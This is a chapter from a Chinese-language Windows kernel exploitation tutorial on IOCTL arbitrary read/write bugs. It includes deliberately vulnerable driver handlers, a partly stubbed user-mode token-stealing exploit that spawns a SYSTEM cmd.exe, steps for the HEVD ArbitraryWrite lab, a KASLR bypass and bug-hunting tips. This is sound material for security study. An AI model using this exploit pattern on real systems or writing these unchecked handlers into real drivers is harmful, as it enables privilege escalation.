# Ch 27 — IOCTL 漏洞

> 目標：理解 IOCTL 任意讀/寫漏洞的成因和利用模式，用 HEVD 練習實際 exploit。

## 典型的 IOCTL 任意寫漏洞

最簡單的形式：驅動沒有驗證「寫入地址」，讓用戶控制寫的目標。

### 漏洞驅動（模擬）

```c
// 有漏洞的 IOCTL handler
// IOCTL: 把 InputBuffer 的 Value 寫到 Address
typedef struct _WRITE_REQUEST {
    PVOID  Address;   // 寫入地址（用戶完全控制！）
    ULONG  Value;     // 寫入的值
} WRITE_REQUEST;

NTSTATUS VulnDispatchIoctl(PDEVICE_OBJECT DevObj, PIRP Irp)
{
    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
    ULONG code = stack->Parameters.DeviceIoControl.IoControlCode;
    
    if (code == IOCTL_WRITE_WHAT_WHERE) {
        if (stack->Parameters.DeviceIoControl.InputBufferLength < sizeof(WRITE_REQUEST)) {
            Irp->IoStatus.Status = STATUS_BUFFER_TOO_SMALL;
            IoCompleteRequest(Irp, IO_NO_INCREMENT);
            return STATUS_BUFFER_TOO_SMALL;
        }
        
        WRITE_REQUEST* req = (WRITE_REQUEST*)Irp->AssociatedIrp.SystemBuffer;
        
        // Bug: 沒有驗證 req->Address
        // 攻擊者可以傳任意地址，包括核心地址
        *(PULONG)req->Address = req->Value;  // 任意核心寫！
        
        Irp->IoStatus.Status      = STATUS_SUCCESS;
        Irp->IoStatus.Information = 0;
        IoCompleteRequest(Irp, IO_NO_INCREMENT);
        return STATUS_SUCCESS;
    }
    // ...
}
```

### 利用（用戶態）

```c
// exploit.c（用戶態）
#include <windows.h>
#include <stdio.h>

typedef struct { PVOID Address; ULONG Value; } WRITE_REQUEST;

// Token 竊取的目標地址（需要先找到 EPROCESS.Token 的地址）
// 在真實 exploit 中，用 infoleak 或 KASLR bypass 找到地址

int main() {
    HANDLE h = CreateFile(L"\\\\.\\VulnDriver", 
                          GENERIC_READ | GENERIC_WRITE, 0, NULL,
                          OPEN_EXISTING, 0, NULL);
    
    // Step 1: 找到 SYSTEM 進程的 Token 地址
    // （實際 exploit 用 NtQuerySystemInformation 或 infoleak）
    PVOID systemTokenAddr = FindSystemToken();  // 假設已實作
    
    // Step 2: 找到當前進程的 EPROCESS.Token 地址
    PVOID myTokenAddr = FindMyProcessToken();   // 假設已實作
    
    // Step 3: 讀取 SYSTEM 的 Token 值
    // （需要 infoleak 或任意讀原語）
    ULONG64 systemToken = ReadKernelQword(systemTokenAddr);
    
    // Step 4: 把 SYSTEM Token 寫入當前進程
    WRITE_REQUEST req;
    req.Address = myTokenAddr;
    req.Value   = (ULONG)systemToken;  // 簡化版（64 位元 Token 需要兩次寫）
    
    DWORD bytes;
    DeviceIoControl(h, IOCTL_WRITE_WHAT_WHERE,
                    &req, sizeof(req), NULL, 0, &bytes, NULL);
    
    // Step 5: 驗證提權成功
    system("whoami");  // 應輸出 nt authority\system
    
    // Step 6: 啟動 SYSTEM shell
    system("cmd.exe");
    
    CloseHandle(h);
}
```

## HEVD 任意寫練習

HEVD 的 `ArbitraryWrite` 挑戰幾乎和上面一樣。

```
1. 安裝 HEVD：
   sc create HEVD type= kernel binPath= C:\HEVD.sys
   sc start HEVD

2. 找 IOCTL Code：
   - 看 HEVD 原始碼，找 IOCTL_HEVD_ARBITRARY_WRITE 的定義
   - 或用 IDA/Ghidra 逆向 HEVD.sys，找 MajorFunction[IRP_MJ_DEVICE_CONTROL] 的分支

3. 實作 exploit：
   - 用 NtQuerySystemInformation(SystemModuleInformation) 找 ntoskrnl 基址
   - 加上 PsInitialSystemProcess 的 RVA 找到 SYSTEM 進程的 EPROCESS
   - 走 ActiveProcessLinks 找 SYSTEM 的 Token
   - 找當前進程的 Token
   - 用 HEVD 的 IOCTL 做任意寫：把 SYSTEM Token 寫入當前進程
```

## 任意讀漏洞

類似架構，但方向相反：

```c
// 漏洞驅動
typedef struct _READ_REQUEST {
    PVOID  Address;      // 讀取地址（用戶控制）
    ULONG  Size;         // 讀多少（用戶控制）
} READ_REQUEST;

case IOCTL_READ_WHAT_WHERE: {
    READ_REQUEST* req = (READ_REQUEST*)SystemBuffer;
    // Bug: 沒有驗證 Address 是否是用戶態地址
    RtlCopyMemory(OutputBuffer, req->Address, req->Size);  // 洩漏核心記憶體
}
```

利用：讀取核心記憶體來 bypass KASLR：

```c
// 讀 ntoskrnl.exe 某個已知 RVA 的地址，推算 kernel base
PVOID knownOffset = (PVOID)(kernelBase + KNOWN_RVA);  // KNOWN_RVA 從符號找
BYTE  buf[8];
ReadKernel(knownOffset, buf, 8);
// 從讀到的值推算出 kernel base = 拿到 KASLR bypass
```

## METHOD_NEITHER 的特殊危險

Ch 10 提到的 `METHOD_NEITHER`：I/O Manager 把用戶態指針直接傳給驅動，沒有任何保護。

```c
// 漏洞：METHOD_NEITHER + 沒有驗證
case IOCTL_NEITHER_WRITE: {
    PVOID userPtr = stack->Parameters.DeviceIoControl.Type3InputBuffer;
    ULONG len     = stack->Parameters.DeviceIoControl.InputBufferLength;
    
    // 沒有：
    // 1. 檢查 userPtr 是否 >= MmUserProbeAddress（核心地址）
    // 2. ProbeForRead
    // 3. __try/__except
    
    // 直接讀取：如果 userPtr 是核心地址 → 讀取核心記憶體（infoleak）
    // 如果 userPtr 是可寫地址且 len 大 → 在核心態寫 OutputBuffer 到 userPtr → ???
    RtlCopyMemory(OutputBuffer, userPtr, len);
}
```

攻擊者傳 `userPtr = 0xFFFFF80012345678`（核心地址），驅動直接從核心讀取 `len` 個 bytes 到 OutputBuffer——任意核心讀。

## 漏洞挖掘：逆向第三方驅動

1. **目標驅動的 IOCTL Dispatch**：找 `MajorFunction[0xE]` 的函式，反組譯
2. **找 switch 或 if-else**：按 IOCTL code 分支的地方
3. **每個 case 看**：是否驗證長度、是否驗證指針、有無 out-of-bound 可能
4. **Fuzzing**：用 ioctl-fuzzer 或自寫 fuzzer，對所有可能的 IOCTL code 發隨機數據

工具：
- **WDM WDF Fuzzer**：自動枚舉設備和 IOCTL
- **syzkaller**（Google）：支援 Windows 的核心 fuzzer

## 自我檢核

- [ ] 任意寫漏洞的典型成因：沒有驗證用戶傳入的「目標地址」
- [ ] Token 竊取的步驟：找 SYSTEM EPROCESS → 讀 Token → 寫入當前進程的 Token
- [ ] METHOD_NEITHER + 缺少地址驗證 = 用戶可以傳核心地址 → 核心讀/寫
- [ ] HEVD 是安全的本地練習環境，`ArbitraryWrite` 是入門挑戰
- [ ] 挖掘思路：逆向 IOCTL Dispatch → 找缺少驗證的路徑 → Fuzzing

→ [Ch 28 任意寫利用](./28-arbitrary-write-exploit.md)
